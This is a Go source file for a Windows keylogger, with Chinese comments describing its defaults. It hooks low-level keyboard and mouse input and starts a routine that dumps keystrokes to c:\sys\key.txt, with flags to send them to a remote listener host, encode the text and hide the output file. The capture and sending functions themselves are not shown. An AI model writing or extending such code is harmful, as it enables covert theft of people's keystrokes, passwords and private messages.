package main

import (
	"flag"
	"github.com/guidoxie/keyboard/listener/win32"
)

// 默认配置
const (
	defaultPath     = "c:\\sys\\key.txt" // 默认文件保存路径
	defaultHost     = ""                 // 默认远程接收地址
	defaultIsEncode = false              // 默认不进行文本加密
	defaultIsHidden = false              // 默认不进行文件隐藏
)

var (
	kbHook win32.HHOOK
	msHook win32.HHOOK
)

func main() {
	var err error
	path := flag.String("o", defaultPath, "output to file")
	host := flag.String("lh", defaultHost, "listener host")
	isEncode := flag.Bool("E", defaultIsEncode, "encode text")
	isHidden := flag.Bool("H", defaultIsHidden, "hidden file")
	flag.Parse()
	kbHook, err := win32.SetWindowsHookEx(win32.WH_KEYBOARD_LL, keyboardCallBack, 0, 0)
	if err != nil {
		panic(err)
	}
	defer win32.UnhookWindowsHookEx(kbHook)
	msHook, err := win32.SetWindowsHookEx(win32.WH_MOUSE_LL, mouseCallBack, 0, 0)
	defer win32.UnhookWindowsHookEx(msHook)
	go keyDump(*path, *host, *isEncode, *isHidden)
	win32.GetMessage(new(win32.MSG), 0, 0, 0)
}
